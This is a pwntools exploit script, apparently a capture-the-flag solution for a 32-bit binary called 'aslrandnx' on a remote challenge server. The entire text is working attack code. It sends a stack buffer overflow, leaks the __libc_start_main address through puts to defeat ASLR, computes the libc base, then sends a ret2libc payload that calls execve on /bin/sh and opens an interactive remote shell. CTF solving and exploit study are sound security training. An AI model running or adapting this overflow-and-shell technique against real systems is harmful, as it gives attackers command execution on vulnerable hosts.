from pwn import *

r = remote("pwn1.0ops.sjtu.cn", 10005)
# r = process('./aslrandnx')
local = ELF('./aslrandnx')

rep = 0x28
puts = local.plt['puts']
getInput = 0x080484cb
_start_main_got = local.got['__libc_start_main']

payload1 = b'A' * (rep + 4) + p32(puts) + p32(getInput) + p32(_start_main_got)

r.sendline(payload1)

print(r.recvline())
_main = r.recvline().strip()

# libc = ELF('./libc6-i386_2.23-0ubuntu11.2_amd64.so')

libc = ELF('libc6_2.23-0ubuntu11.2_i386.so')
# libc = ELF('/lib32/libc.so.6')
_libcmain = libc.symbols['__libc_start_main']

libc_base = u32(_main) - _libcmain
print("libc base:", hex(libc_base))

bin_sh = next(libc.search(b'/bin/sh\x00')) + libc_base
execve = libc.symbols['execve'] + libc_base

payload2 = b'A' * (rep + 4) + p32(execve) + p32(0xffffffff) + p32(bin_sh) + p32(0) + p32(0)

print(payload2)

r.sendline(payload2)

#print(r.recvall())

r.interactive()
